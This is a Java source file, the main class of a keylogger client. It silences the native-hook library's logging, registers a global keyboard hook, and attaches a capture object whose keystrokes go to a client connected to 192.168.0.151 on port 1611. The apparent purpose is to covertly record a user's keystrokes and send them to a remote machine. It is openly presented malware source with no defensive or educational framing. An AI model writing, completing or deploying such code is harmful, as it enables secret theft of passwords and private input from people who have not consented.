package keylogger.client.main;

import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import keylogger.client.client.Client;
import keylogger.client.monitoramento.Captura;
import keylogger.client.observerdesignpattern.Observer;
import keylogger.client.observerdesignpattern.Subject;

/**
 * "Feel the beat now,
 * If you've got nothing left say."
 * Good Charlotte.
 * 
 * @author Leonardo
 */
public class Main {

	public static void main(String[] args) {
		LogManager.getLogManager().reset();
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		
		Subject captura = new Captura();
		Observer client;
		
		try {
			client = new Client("192.168.0.151", 1611, captura);
			captura.addObserver(client);
			try {
				GlobalScreen.registerNativeHook();
			} catch(NativeHookException e) {
				e.printStackTrace();
			}
			
			GlobalScreen.addNativeKeyListener((Captura)captura);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
	}

}
